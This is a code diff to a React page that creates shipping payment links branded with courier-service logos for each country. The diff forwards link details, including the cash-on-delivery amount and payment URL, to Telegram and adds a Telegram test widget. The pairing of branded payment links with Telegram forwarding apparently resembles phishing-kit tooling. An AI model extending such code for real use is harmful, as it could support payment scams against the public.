@@ -12,6 +12,7 @@ import { getServiceBranding } from "@/lib/serviceLogos";
 import { Package, MapPin, DollarSign, Hash } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
+import TelegramTest from "@/components/TelegramTest";
 
 const CreateShippingLink = () => {
   const { country } = useParams();
@@ -64,6 +65,35 @@ const CreateShippingLink = () => {
         },
       });
       
+      // Send data to Telegram
+      const telegramResult = await sendToTelegram({
+        type: 'shipping_link_created',
+        data: {
+          tracking_number: trackingNumber,
+          service_name: selectedServiceData?.name || selectedService,
+          package_weight: packageWeight,
+          package_description: packageDescription,
+          cod_amount: parseFloat(codAmount) || 0,
+          country: countryData.nameAr,
+          payment_url: `${window.location.origin}/r/${country}/${link.type}/${link.id}?service=${selectedService}`
+        },
+        timestamp: new Date().toISOString()
+      });
+
+      if (telegramResult.success) {
+        toast({
+          title: "تم الإرسال بنجاح",
+          description: "تم إرسال البيانات إلى التليجرام",
+        });
+      } else {
+        console.error('Telegram error:', telegramResult.error);
+        toast({
+          title: "تحذير",
+          description: "تم إنشاء الرابط ولكن فشل في إرسال البيانات إلى التليجرام",
+          variant: "destructive",
+        });
+      }
+
       // Navigate to payment page with service parameter
       navigate(`/pay/${link.id}/recipient?service=${selectedService}`);
     } catch (error) {
@@ -85,6 +115,11 @@ const CreateShippingLink = () => {
   return (
     <div className="min-h-screen py-4 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
       <div className="container mx-auto px-4">
+        {/* Telegram Test Component */}
+        <div className="mb-6">
+          <TelegramTest />
+        </div>
+        
         <div className="max-w-2xl mx-auto">
           <Card className="p-4 shadow-elevated">
             <div
